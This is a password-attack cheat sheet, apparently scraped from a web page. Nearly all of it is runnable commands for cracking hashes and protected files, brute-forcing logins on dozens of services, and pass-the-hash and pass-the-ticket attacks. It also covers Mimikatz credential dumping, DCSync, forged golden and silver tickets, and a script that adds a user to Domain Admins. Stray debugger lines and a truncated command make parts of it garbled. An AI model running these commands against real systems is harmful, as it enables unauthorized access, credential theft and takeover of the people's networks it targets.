# Password References:
---


# CEWL
# Scans osbornepro.com and builds a password list with a minimum of 6 chars
cewl www.osbornepro.com -m 6 -w osbornepro-cewl.txt

# CRUNCH
crunch 8 8 -t ,@@^^%%%
# first 8 is minimum length
# last 8 is maxmimum length
# -t goes before the pattern we define
# @ Lowercase alpha chars
# , Upper case alpha chars
# % Numberic chars
# ^ Special chars including space

# Generate password list based on predefined charsets
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o /tmp/crunch.txt
# -f is the path to the char set file
# mixaplpha set includes all lower and uppercase letters

# Generate password list using manually defined chars
crunch 4 6 0123456789ABCDEF -o /tmp/crunch.txt

# JOHN THE RIPPER
# Below modification in /etc/john/john.conf adds 2 digits at the end of each word in defined list
$[0-9]$[0-9]

# Create wordlist using the defined rule
$ john --wordlist=osbornepro-wordlist.txt --rules --stdout &gt; /tmp/new-wordlist.txt
      debugger eval code:1:62
hashid '$6$asdasdaaaaaaaaaaaaaaaaaaaaa'

# Interactive GUI Tool
hash-identifier
      debugger eval code:1:62
# SMB Credential Check
acccheck -t 10.0.0.1 -u rosborne -p Password123!

# SMB Brute Force
acccehck -t 10.0.0.1 -U user.lst -P pass.lst
acccehck -T host.lst -U user.lst -P pass.lst

# Install acccheck
wget https://labs.portcullis.co.uk/download/acccheck-0-2-1.tar.gz; tar xf acccheck-0-2-1.tar.gz; rm acccheck-0-2-1.tar.gz; cd acccheck-0-2-1/; mv acccheck.pl /usr/local/sbin/acccheck
      debugger eval code:1:62
# SSH (Can Pass the Ticket Only)
ssh -o GSSAPIAuthentication=yes rosborne@osbornepro.com -vv
# Look for the line
#    "No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1045)"
# Copy your ticket to the expected location
cp rosborne.ccache /tmp/krb5cc_1045
ssh -o GSSAPIAuthentication=yes rosborne@osbornepro.com

# SMB PTH
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:&lt;ntlm hash&gt; //10.0.0.1 cmd
pth-smbclient //10.0.0.1/C$ -U osbornepro.com/rosborne%aad3b435b51404eeaad3b435b51404ee:&lt;ntlm hash&gt;
smbclient -U osbornepro.com/rosborne%hash:hash -n &lt;netbios name&gt; -W osbornepro.com //10.0.0.1/share$
smbclient //10.0.0.1/C$ -U rosborne --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W osbornepro.com
crackmapexec 10.0.0.1 -u user -H &lt;hash&gt;

# WINRM PTH
evil-winrm.rb -i 10.0.0.1 -u rosborne -H BD1C6503987F8FF006296118F359FA79
python /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:&lt;ntlm hash&gt; Administrator@&lt;target&gt;
wmiexec.py osobrnepro.com/rosborne@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

# RDP PTH
# Only possible when the system has Restricted Admin Mode enabled
# Enable Restricted Admin Mode
cme smb 10.0.0.1 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
xfreerdp /u:admin /d:domain /pth:hash:hash /v:&lt;ip&gt;\n"

# LDAP PTH (Impacket Collection)
# Dump Hashes
secretsdump.py rosborne@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

# Authenticate to Exchange Server
python3
&gt;&gt;&gt; import ldap3
&gt;&gt;&gt; user = 'OSBORNEPRO\\EXCHANGE$'
&gt;&gt;&gt; password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
&gt;&gt;&gt; server = ldap3.Server('OSBORNEPRO.COM')
from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
&gt;&gt;&gt; connection.bind()
&gt;&gt;&gt; from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
&gt;&gt;&gt; user_dn = 'CN=IT User,OU=Standard Accounts,DC=osbornepro,DC=com'
&gt;&gt;&gt; group_dn = 'CN=Domain Admins,CN=Users,DC=osbornepro,DC=com'
&gt;&gt;&gt; addUsersInGroups(connection, user_dn, group_dn)
True

debugger eval code:1:62
$DomainObj = [System.DirectoryServices.ActiveDirectory.Domain)::GetCurrentDomain()
$PDC = ($DomainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($DomainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName

# Use a Spray Password Tool that abides by above policy
.\Spray-Passwords.ps1 -Pass Qwerty123! -Admin
# -Admin flag checks admin accoutns as well
# RESOURCE: https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
        debugger eval code:1:62
# List Possible Hash Formats
john --list=formats

# Attempt Every Possible Character Combo
john --incremental hashes.txt

# Pause Cracking by entering "Q" or Ctrl + C
john --restore

# 7ZIP FILE CRACKING
7z2john.pl protected.7z &gt; protected.hash
john --wordlist=wordlist.txt protected.hash
# Extract the archive
7z e protected.7z -peasy

# ZIP FILE CRACKING
zip2john protected.zip &gt; zip.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt

# PDF FILE CRACKING
pdf2john.pl pdf_protected.pdf &gt; pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash

# OFFICE FILE CRACKING
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/office2john.py
# Put all files in same directory
python office2john.py PassProtectedWordFile.docx &gt; hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt

# MD5 HASH CRACK
john --format=Raw-MD5 passwordFile

# NTLM HASH CRACKING
john hash.txt --format=NT
john --wordlist=cewl.tx…
debugger eval code:1:62
python sshng2john.py ~/.ssh/id_rsa.key
python sshng2john.py ~/.ssh/id_rsa.key &gt; hash.txt
john --wordlist=rockyou.txt hash.txt
        debugger eval code:1:62
# DUMP WINDOWS SAM DATABASE
mimikatz.exe
# Check you have priv needed
priviledge::debug
# Elevate security token from high to system
token::elevate
# Dump the contents of the SAM database
lsadump::sam

# DUMP CACHED CREDENTIALS
mimikatz.exe
privilege::debug
# Dump creds and hashes of all logged on users
sekurlsa::logonpasswords
      debugger eval code:1:62
medusa -h 10.0.0.1 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
# -h is the target host
# -u is the username
# -P is the password file
# -M is the authentication scheme
# -m is the URI exectension
# -d cant be used to brute force other protocols

# SSH BRUTE
medusa -u rosborne -P /usr/share/seclists/Passwords/probable-v2-top207.txt -h 10.0.0.1 -M ssh -n 22

# TELNET BRUTE
medusa -u rosborne -P pass.lst -h 10.0.0.1 -M telnet

# FTP BRUTE
medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1
medusa -M ftp -C userpass.txt

# SMB BRUTE
medusa -h 10.0.0.1 -U user.txt -P pass.lst -M smbnt

# MSSQL BRUTE
medusa -h 10.0.0.1 –U user.txt –P pass.lst –M mssql

# MySQL BRUTE
medusa -h 10.0.0.1 -u rosborne -P pass.lst -f -t 3 -M mysql

# PostGreSQL
medusa -h 10.0.0.1 –U user.txt –P pass.lst –M postgres

# VNC BRUTE
medusa -h 10.0.0.1 –u root -P pass.lst –M vnc
      debugger eval code:1:62
# SSH BRUTE
ncrack -p 22 --user rosborne -P pass.lst 10.0.0.1 -T 5

# TELNET BRUTE
ncrack -U user.txt –P pass.lst 10.0.0.1:23

# FTP BRUTE
ncrack -U user.txt -P pass.lst ftp://10.10.0.1

# SMB BRUTE
ncrack –U user.txt -P pass.lst 10.0.0.1 –p 445

# PostGreSQL
ncrack –v –U user.txt –P pass.lst 10.0.0.1:5432

# RDP BRUTE
ncrack -vv --user rosborne -P pass.lst rdp://10.0.0.1

# VNC BRUTE
ncrack -V --user root -P pass.lst 10.0.0.1:5900
      debugger eval code:1:62
# TELNET BRUTE
patator telnet_login host=10.0.0.1 inputs='FILE0\\nFILE1' 0=user.txt 1=pass.txt  persistent=0 prompt_re='Username: | Password:'

# FTP BRUTE
patator ftp_login host=10.0.0.1 user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt

# PostGreSQL
patator pgsql_login host=10.0.0.1 user=FILE0 0=user.txt password=FILE1 1=pass.lst

# OracleSQL
# pip3 install cx_Oracle --upgrade
patator oracle_login sid=$SID host=10.0.0.1 user=FILE0 password=FILE1 0=user.txt 1=pass.lst -x ignore:code=ORA-01017

# VNC BRUTE
patator vnc_login host=10.0.0.1 password=FILE0 0=pass.lst –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
     debugger eval code:1:62
wpscan --url http://10.0.0.1/wp-parent --usernames wpuser.lst --passwords /usr/share/wordlists/rockyou.txt
        debugger eval code:1:62
crowbar -b rdp -s 10.0.0.1/32 -u admin -C passwordlist.txt -n 1
# -b is the protocol
# -s is the target
# -u is the username
# -C is the word list
# -n is number of threads
      debugger eval code:1:62
# Hydra http-form-post Help
hydra http-form-post -U | less

# View target webpage form data
curl -sL http://10.0.0.1

# Use above info to brute force the HTTP POST Form
hydra 10.0.0.1 http-form-post "/form/frontpage.php:user=admin&amp;pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
    # -l is the user
    # -P is the wordlist
    # -f stop attack on first successful result
    # -vV really verbose

# SSH BRUTE
hydra -s &lt;port&gt; -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt &lt;ip&gt; -t &lt;number of threads up to 16&gt; -V ssh

# TELNET BRUTE
hydra -L usernames.txt -P passwords.txt 10.0.0.1 telnet -V

# FTP BRUTE
hydra -L user.txt -P pass.txt 10.0.0.1 ftp -V -e nsr

# SMB BRUTE
hydra -L usernames.txt -P passwords.txt 10.0.0.1 smb -V -f

# MSSQL BRUTE
hydra -L user.txt –P pass.txt 10.0.0.1 mssql

# MySQL BRUTE
hydra -L usernames.txt -P passwords.txt 10.0.0.1 mysql -V -f

# PostGreSQL
hydra -L usernames.txt -P passwords.txt 10.0.0.1 postgres -V

# IMAP BRUTE
hydra -l USERNAME -P /path/to/passwords.txt -f 10.0.0.1 imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f 10.0.0.1 imap -V

# SMTP BRUTE
hydra -l rosborne -P pass.lst 10.0.0.1 smtp -V
hydra -l rosborne -P pass.lst -s 587 10.0.0.1 -S -v -V

# POP BRUTE
hydra -l rosborne -P pass.lst -f 10.0.0.1 pop3 -V
hydra -S -v -l rosborne -P pass.lst -s 995 -f 10.0.0.1 pop3 -V

# RDP BRUTE
hydra -V -f -L user.txt -P pass.lst rdp://10.0.0.1

# VNC BRUTE
hydra -P passwords.txt 10.0.0.1 vnc -V

# SNMP
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt server.osbornepro.com snmp

# ELASTICSEARCH BRUTE
hydra -L users.txt -P password.lst 10.0.0.1 -s 9200 http-get /

# DOCKER REGISTRY BRUTE
hydra -L users.txt  -P password.lst 10.0.0.1 -s 5000 https-get /v2/

# REDIS BRUTE
hydra –P pass.txt redis://10.0.0.1:6379

																	debugger eval code:1:62
# KERBEROASTING
# Request a service ticket using SPN name
Add-Type -AssemblyName System.IdentityModel
New-Object -TypeName System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/spn-name.osbornepro.com'

# Use Mimikatz to download above commands generated service ticket to disk
kerberos::list /export

# Use kerberoast apt package to attempt decrypting the ticket
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt /var/ftp/1-40a50000-osbornepro@HTTP~spn-name.osbornepro.com-OSBORNEPRO.COM.kirbi

#----------------------------------------------
# OVERPASS THE HASH
# Obtain kerberos ticket without performing NTLM auth over the network
# This will open a new powershell session as the rosborne user
sekurlsa::pth /user:rosborne /domain:osbornepro.com /ntlm:theNTLMHash /run:PowerShell.exe

# Authenticate to a network share on a DC to generate a TGT
net use \\dc01

# List newly requested kerberos tickets. TGT and TGS are obtained for the CIFS service
klist

# Open cmd on DC01 as rosborne by reusing the kerberos TGT
.\psexec.exe \\dc01 cmd.exe

#----------------------------------------------
# PASS THE TICKET
# Create a Kerberos TGT using an NT hash
python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F osbornepro.com/rosborne
# Copy the ticket to /tmp/krb5cc_0
cp user.ccache /tmp/krb5cc_0
# Set the KRB5CCNAME environment variable to the ticket location
export KRB5CCNAME=/tmp/krb5cc_0

#----------------------------------------------
# SILVER TICKET METHOD
# Get User SID
$SID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value

# Open Mimikatz Tool
mimikatz.exe
# Flush any existing kerberos tickets
kerberos::purge
kerberos::list

# Obtain Silver Ticket
kerberos::golden /user:rosborne /domain:osbornepro.com /sid:$SID /target:web.osbornepro.com /service:HTTP /rc4:&lt;Password hash of iis service service account&gt; /ptt
# /ptt injects this into memory
# A new service ticket for the SPN has been loaded into Memory. Mimikatz set appropriate group permissions in the forged ticket

#----------------------------------------------
# GOLD TICKET METHOD
# Extract the password of krbtgt with Mimikatz. This will need to be run on a domain controller
mimikatz.exe
lsadump::lsa /patch
# OR
lsadump::dcsync /user:krbtgt

# Creating the Golden Ticket and injecting it into memory does not require any admin privileges
mimikatz.exe
kerberos::purge
# Create the golden ticket
kerberos::golden /user:fakeuser /domain:osbornepro.com /sid:S-1-5... /krbtgt:&lt;password hash&gt; /ptt
# The UserID is set to 500 by default which is the RID of the Administrator for the domain
# The GroupID values are set by default to the most privileged groups in AD
# Access to remote computers requires the use of the computers hostname
# Using an IP Address will force NTLM authentication and not use the ticket

#----------------------------------------------
# DC SYNC METHOD
# Dump the password hashes of every account in the AD domain without logging in to a domain controller
mimikatz.exe
# Start replication, the /user option defines the target user to sync
lsadump::dcsync /user:Administrator
# OR
lsadump::dcsync /domain:osbornepro.com /user:rosborne

# PowerShell Function to Force Replication
Function Replicate-AllDomainController {
    (Get-ADDomainController -Filter *).Name | Foreach-Object {repadmin /syncall $_ (Get-ADDomain).DistinguishedName /e /A | Out-Null}
    Start-Sleep 10; Get-ADReplicationPartnerMetadata -Target "$env:USERDNSDOMAIN" -Scope Domain | Select-Object -Property Server, LastReplicationSuccess
}  # End Function

Replicate-AllDomainController

debugger eval code:1:62
# SMB BRUTE
nmap --script smb-brute -p 445 10.0.0.1

# SNMP BRUTE
nmap -sU --script snmp-brute 10.0.0.1 --script-args snmp-brute.communitiesdb=wordlist.txt

# RSYNC BRUTE
nmap -sV --script rsync-brute --script-args userdb=user.txt,passdb=pass.lst -p 873 10.0.0.1

# REDIS BRUTE
nmap --script redis-brute -p 6379 10.0.0.1

# SOCKS BRUTE
nmap  -vvv -sCV --script socks-brute --script-args userdb=user.txt,passdb=pass.lst,unpwndb.timelimit=30m -p 1080 10.0.0.1

# MSSQL BRUTE
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=osbornepro.com,userdb=user.txt,passdb=pass.lst,ms-sql-brute.brute-windows-accounts 10.0.0.1

# PostGreSQL BRUTE
nmap -sV --script pgsql-brute --script-args userdb=user.txt,passdb=pass.lst -p 5432 10.0.0.1

# MONGO BRUTE
nmap -sV --script mongodb-brute -n -p 27017 10.0.0.1

# ORACLE SQL
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=&lt;SID&gt; &lt;IP&gt;
# Offline Oracle SQL Hash Brute Force
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.0.0.1

# IMAP BRUTE
nmap -sV --script imap-brute -p 143 10.0.0.1

# VNC BRUTE
nmap -sV --script pgsql-brute --script-args userdb=user.txt,passdb=pass.lst -p 5432 10.0.0.1

# LDAP BRUTE
nmap --script ldap-brute -p 389 10.0.0.1

# IRC BRUTE
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=users.txt,passdb=/pass.lst -p &lt;PORT&gt; 10.0.0.1

# iSCSI BRUTE
nmap -sV --script iscsi-brute --script-args userdb=usernames.txt,passdb=pass.lst -p 3260 10.0.0.1

# CASSANDRA BRUTE
nmap --script cassandra-brute -p 9160 10.0.0.1

# AFP BRUTE
nmap -p 548 --script afp-brute 10.0.0.1

# AJP BRUTE
nmap --script ajp-brute -p 8009 10.0.0.1

debugger eval code:1:62
undefined
